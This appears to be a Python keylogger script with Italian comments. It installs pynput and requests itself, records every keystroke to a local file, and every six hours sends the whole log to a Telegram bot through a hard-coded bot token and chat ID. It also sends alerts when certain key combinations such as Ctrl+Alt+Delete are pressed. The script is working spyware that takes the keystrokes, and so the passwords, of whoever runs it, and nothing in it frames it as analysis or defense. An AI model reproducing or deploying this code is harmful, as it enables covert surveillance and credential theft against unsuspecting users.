import subprocess
import sys

# Installazione dei moduli necessari se non sono già presenti
required_modules = ['pynput', 'requests']
for module in required_modules:
    subprocess.check_call([sys.executable, "-m", "pip", "install", module])

import threading
import time
from pynput.keyboard import Key, Listener
import requests

# Configurazione del bot Telegram
TELEGRAM_BOT_TOKEN = '8301948593:AAEBuN0JBeSPc3B_DZJZokvX2WCQuSSlQwM'
CHAT_ID_1 = '7642937843'
CHAT_ID_2 = '7642937843'

# Funzione per inviare messaggi tramite il bot Telegram
def send_telegram_message(chat_id, message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=payload)

# Variabili per il keylogging
keys = []
log_file = 'keylog.txt'

# Funzione per salvare i tasti premuti in un file
def write_to_file(keys):
    with open(log_file, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(' ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('backspace') > 0:
                f.write('<BACKSPACE>')
            elif k.find('tab') > 0:
                f.write('<TAB>')
            elif k.find('Key') == -1:
                f.write(k)
            else:
                f.write('<' + k + '>')
        f.write('\n')

# Funzione per inviare il log ogni 6 ore
def send_log_every_6_hours():
    while True:
        time.sleep(21600)  # 6 ore in secondi
        with open(log_file, 'r') as f:
            log_content = f.read()
        send_telegram_message(CHAT_ID_1, log_content)
        send_telegram_message(CHAT_ID_2, log_content)

# Funzione per gestire la pressione dei tasti
def on_press(key):
    keys.append(key)
    if key == Key.f11 or key == Key.esc:
        send_telegram_message(CHAT_ID_1, f'Alert: {key} pressed')
        send_telegram_message(CHAT_ID_2, f'Alert: {key} pressed')
    elif key == Key.ctrl_l and 'ctrl_pressed' not in globals():
        globals()['ctrl_pressed'] = True
    elif key == Key.alt_l and 'alt_pressed' not in globals():
        globals()['alt_pressed'] = True
    elif key == Key.delete and 'ctrl_pressed' in globals() and 'alt_pressed' in globals():
        send_telegram_message(CHAT_ID_1, 'Alert: Ctrl+Alt+Delete pressed')
        send_telegram_message(CHAT_ID_2, 'Alert: Ctrl+Alt+Delete pressed')
        globals().pop('ctrl_pressed', None)
        globals().pop('alt_pressed', None)
    elif key == Key.f4 and 'alt_pressed' in globals():
        send_telegram_message(CHAT_ID_1, 'Alert: Alt+F4 pressed')
        send_telegram_message(CHAT_ID_2, 'Alert: Alt+F4 pressed')
        globals().pop('alt_pressed', None)
    elif key == Key.tab and 'alt_pressed' in globals():
        send_telegram_message(CHAT_ID_1, 'Alert: Alt+Tab pressed')
        send_telegram_message(CHAT_ID_2, 'Alert: Alt+Tab pressed')
        globals().pop('alt_pressed', None)

# Funzione per gestire il rilascio dei tasti
def on_release(key):
    if key == Key.esc or key == Key.f4:
        return False
    elif key == Key.ctrl_l and 'ctrl_pressed' in globals():
        globals().pop('ctrl_pressed', None)
    elif key == Key.alt_l and 'alt_pressed' in globals():
        globals().pop('alt_pressed', None)

# Avvio del listener per i tasti
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# Avvio del thread per inviare il log ogni 6 ore
threading.Thread(target=send_log_every_6_hours).start()